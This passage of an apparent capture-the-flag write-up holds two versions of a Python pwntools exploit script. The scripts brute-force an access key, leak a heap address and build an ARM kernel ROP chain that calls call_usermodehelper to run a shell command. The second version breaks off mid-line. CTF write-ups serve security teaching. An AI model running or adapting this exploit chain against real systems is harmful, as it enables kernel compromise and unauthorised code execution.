class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(save_sp+heap),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">12</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                          pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                          sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                          rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                          pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c040</span>),stack+<span class="number">4</span>*<span class="number">19</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+save_sp-<span class="number">0x24</span>),stack+<span class="number">4</span>*<span class="number">22</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8022b754</span>),stack+<span class="number">4</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8022b754 &lt;dio_complete+120&gt;    ldr    ip, [r4, #0x24]</span></span><br><span class="line"><span class="string">    0x8022b758 &lt;dio_complete+124&gt;    stm    sp, &#123;r7, ip&#125;</span></span><br><span class="line"><span class="string">    0x8022b75c &lt;dio_complete+128&gt;    blx    r1 </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125; &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+sl),stack+<span class="number">4</span>*<span class="number">30</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;                  &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">33</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">37</span>)  <span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">38</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80101524</span>),stack+<span class="number">4</span>*<span class="number">39</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80101524 &lt;secondary_startup_arm+100&gt;    mov    sp, ip</span></span><br><span class="line"><span class="string">    0x80101528 &lt;secondary_startup_arm+104&gt;    ldr    ip, [sl, #0x10]</span></span><br><span class="line"><span class="string">    0x8010152c &lt;secondary_startup_arm+108&gt;    add    ip, ip, sl</span></span><br><span class="line"><span class="string">    0x80101530 &lt;secondary_startup_arm+112&gt;    mov    pc, ip</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    offsets=(call_usermodehelper-(heap+sl))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    payload=str_change(payload,p32(offsets),sl+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简化版</p>
<p>也就简化了20行😢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span>    <span class="comment"># server(&quot;\x10&quot;,1,&#x27;b&#x27;)</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, 